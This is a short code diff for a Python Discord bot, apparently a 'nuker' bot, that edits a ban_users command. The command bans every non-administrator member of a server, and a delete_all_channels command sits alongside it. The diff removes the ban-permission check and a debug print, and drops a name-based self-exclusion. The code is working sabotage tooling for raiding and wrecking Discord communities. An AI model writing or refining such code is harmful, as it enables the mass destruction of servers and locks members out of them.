@@ -71,11 +71,9 @@ async def delete_all_channels(interaction: discord.Interaction) -> None:
     description="Ban all users in the server",
     guild=testGuild
 )
-@commands.has_permissions(ban_members=True)
 async def ban_users(interaction: discord.Interaction) -> None:
-    print(interaction.app_permissions)
     for user in interaction.guild.members:
-        if str(user) == "Nuker Bot#2899" or user.guild_permissions.administrator:
+        if user.guild_permissions.administrator:
             continue
 
         await user.ban()
